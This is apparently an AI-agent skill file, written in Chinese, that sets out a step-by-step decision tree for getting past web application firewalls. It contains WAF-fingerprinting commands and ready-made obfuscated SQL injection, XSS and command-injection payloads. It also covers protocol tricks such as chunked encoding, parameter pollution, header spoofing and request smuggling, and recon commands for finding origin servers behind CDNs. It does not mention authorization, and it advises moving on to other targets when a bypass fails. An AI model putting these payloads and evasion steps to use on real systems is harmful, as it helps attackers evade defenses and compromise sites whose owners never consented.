---
name: waf-bypass-decision-tree
description: 请求被拦了，先判是 WAF 还是业务逻辑，再按 payload / 协议 / 架构三层递进。核心是知道什么时候绕不过去该换目标。
---

# WAF 绕过的决策树

被拦之后的第一件事不是换 payload，是**确认拦住你的是什么**。

90% 的"WAF 拦截"其实是业务逻辑拒绝，白折腾。

---

## 一、先判：真的被 WAF 拦了吗

### 三个必查信号

| 信号 | 说明 |
| :--- | :--- |
| 状态码 | 403 / 406 / 501 / 444 且响应体很短（<1KB）→ 大概率 WAF |
| 响应头 | 有 `Server: cloudflare` / `X-WAF` / `Set-Cookie: acw_tc`（阿里云）等 |
| 响应体 | 统一错误页（"您的请求不合法" / "Request blocked"），不带业务信息 |

**反向判断**：如果响应里有业务相关的字段、有正常的 HTML 结构、状态码是 200 但功能没生效 → **不是 WAF，是业务逻辑**，别在这绕。

### 确认方法

```
1. 发一个明显正常的请求（不带 payload）→ 200
2. 发一个带 payload 的请求 → 403
3. 发一个带"看起来像 payload 但不构成攻击"的请求（比如参数值是 "select"）→ ?
```

- 第 3 步被拦 → WAF 规则很宽（关键词黑名单）
- 第 3 步通过 → WAF 有语义分析，或者你命中了特定规则

### 判 WAF 厂商

```bash
# 常见指纹
curl -sI https://TARGET | grep -iE "server|via|x-cache|x-waf|x-sucuri"
```

| 特征 | 厂商 |
| :--- | :--- |
| `Server: cloudflare` + `cf-ray` | Cloudflare |
| `Set-Cookie: acw_tc` / `acw_sc__v2` | 阿里云 WAF |
| `Set-Cookie: secure` + `Server: nginx` | 腾讯云 WAF |
| `X-Sucuri-ID` | Sucuri |
| `Server: AkamaiGHost` | Akamai |
| `X-CDN: Served-By-Zenedge` | 又拍云 |

**为什么重要**：不同厂商的规则集差异很大。Cloudflare 重语义，阿里云重正则，自研 WAF 常有遗漏的路径。

---

## 二、三层递进

按代价从低到高，不要跳层。

### 第 1 层：payload 变形（改字符串）

适用于：关键词黑名单型 WAF。

```
SQL 注入：
  union select        → /*!50000union*/ /*!50000select*/
  and 1=1             → /*!50000and*/ 1=1
  space               → /**/ 或 %09 %0a %0c %a0
  大小写              → UnIoN SeLeCt（对 MySQL 有效，对正则大小写不敏感的 WAF 无效）
  等价替换            → and → &&  or → ||  = → like 空格 → 括号

XSS：
  <script>            → <scr<script>ipt>（双写）
  alert(1)            → confirm(1) / prompt(1) / top['al'+'ert'](1)
  引号                → 不用引号，用 String.fromCharCode
  括号                → 用模板字符串 或 onerror=eval`...`

命令注入：
  ; id                → %0aid / |id / $(id) / `id`
  空格                → ${IFS} / $IFS$9 / <  / %09
  斜杠                → ${PATH:0:1}
  cat                 → /bin/ca? / c''at / c\at
```

**判断变形是否有效**：一次只改一个维度。同时改大小写+编码+注释，被拦了也不知道是哪层生效。

### 第 2 层：协议层（改请求本身）

适用于：WAF 只解析标准 HTTP。

```
1. 分块传输（Transfer-Encoding: chunked）
   → WAF 不解码 chunked 时，payload 藏在 chunk 边界

2. Content-Type 混淆
   → 用 multipart/form-data 包 JSON，WAF 按 form 解析
   → 用 application/x-www-form-urlencoded 包 JSON

3. 参数污染（HPP）
   → ?id=1&id=union select 1,2,3
   → 后端取第一个 / 最后一个 / 拼接，行为不一致就有机会

4. 超长请求体
   → 在 payload 前塞 8KB 垃圾，有的 WAF 有长度上限，超了直接放行

5. 畸形 header
   → X-Forwarded-For / X-Real-IP 伪造内网 IP，部分 WAF 对"内网来源"放行

6. HTTP/2 降级 / 请求走私
   → 需要特定架构（前端 nginx + 后端 apache），风险高
```

**注意**：第 2 层开始有副作用 —— 可能触发后端 500、可能污染日志。测试环境先验证。

### 第 3 层：架构层（换入口）

适用于：WAF 只保护主站。

```
1. 源站 IP 直连
   → 查历史 DNS 记录 / 证书透明日志 / 子域解析 / 邮件头
   → 找到源站 IP 后直接打，绕过 CDN 和 WAF

2. 备用域名 / 测试域名
   → dev.example.com / test.example.com / staging.example.com
   → 常常没接 WAF

3. 移动端 API
   → app 用的接口可能走不同的网关，规则更松

4. IPv6 入口
   → 很多 WAF 只配了 IPv4

5. 非标准端口
   → 8080 / 8443 / 9000 上的同一应用

6. 第三方集成入口
   → webhook / 回调 / 合作方接口
```

**第 3 层是最有效的**。花 10 分钟找源站 IP，比花 2 小时绕 payload 值得。

---

## 三、源站 IP 的找法

```bash
# 1. 证书透明日志（最有效）
curl -s "https://crt.sh/?q=%25.TARGET&output=json" | jq -r '.[].name_value' | sort -u

# 2. 历史 DNS
#    SecurityTrails / DNSDumpster / ViewDNS 手工查

# 3. 子域解析（很多子域没接 CDN）
subfinder -d TARGET -all -silent | httpx -silent -sc -title

# 4. 邮件头（发一封邮件给目标，看 Received 链）
#    用临时邮箱收，看原始邮件头里的 IP

# 5. 全球 ping
#    ping TARGET 得到 CDN IP；用多地 ping 看是否有 IP 不一致

# 6. favicon hash 反查
python3 -c "
import mmh3, requests, codecs
r = requests.get('https://TARGET/favicon.ico')
print(mmh3.hash(codecs.encode(r.content, 'base64')))
"
# 拿到 hash 后去 FOFA / Shodan 搜 body="..."
```

**验证是不是源站**：直接访问 IP + Host 头，看是否返回同样的内容。

```bash
curl -s -H "Host: TARGET" https://SOURCE_IP/ -k | head -20
```

---

## 四、什么时候该放弃

**设定阈值**：同一类变形试 2 次不通，换层；三层都不通，换目标。

明确该撤的信号：

| 信号 | 说明 |
| :--- | :--- |
| 任何 payload 都 403，包括正常参数 | WAF 是白名单模式，或者你的 IP 被拉黑 |
| 响应时间恒定 0ms | 请求根本没到后端，被边缘节点直接拒 |
| 换 IP 后立刻恢复 | 是 IP 信誉问题，不是规则问题 |
| 变形后仍然 403 且响应体一样 | WAF 在更深层（比如 RASP），payload 层绕不过 |

**最容易被忽略的一条**：换个出口 IP 再试。很多"绕不过"其实是 IP 被拉黑了。

---

## 五、常见误判

| 现象 | 误判 | 实际 |
| :--- | :--- | :--- |
| 403 | WAF 拦截 | 可能是 CSRF token 缺失 / 权限不足 / 方法不允许 |
| 200 但没效果 | 绕过成功但 payload 错 | 可能 WAF 静默拦截（返回 200 + 空数据） |
| 加了 `/**/` 就过了 | 找到绕过方法 | 可能只是那次请求命中了缓存 |
| 换大小写就过了 | WAF 弱 | 可能这条规则本来就不匹配这个参数 |
| 源站 IP 找到了 | 能直连 | 源站可能有 IP 白名单，只允许 CDN 回源 |

**"200 但没效果"要单独排查**：WAF 的静默拦截模式会让你以为请求成功了。判断方法：payload 换成明显会报错的（比如 `'` 单引号），看是否触发数据库报错。没报错 = 请求没到后端。

---

## 六、检查清单

```
[ ] 确认是 WAF 还是业务逻辑：   WAF / 业务 / 不确定
[ ] WAF 厂商：                 ______
[ ] 拦截阈值：                 关键词 / 正则 / 语义 / 白名单
[ ] 试过 payload 变形：        是 / 否
[ ] 试过分块/编码：            是 / 否
[ ] 找过源站 IP：              找到(___) / 没找到
[ ] 换过出口 IP：              是 / 否
[ ] 有备用入口吗：             dev/test/app/ipv6/非标端口
[ ] 决定：                     继续绕 / 换入口 / 换目标
```
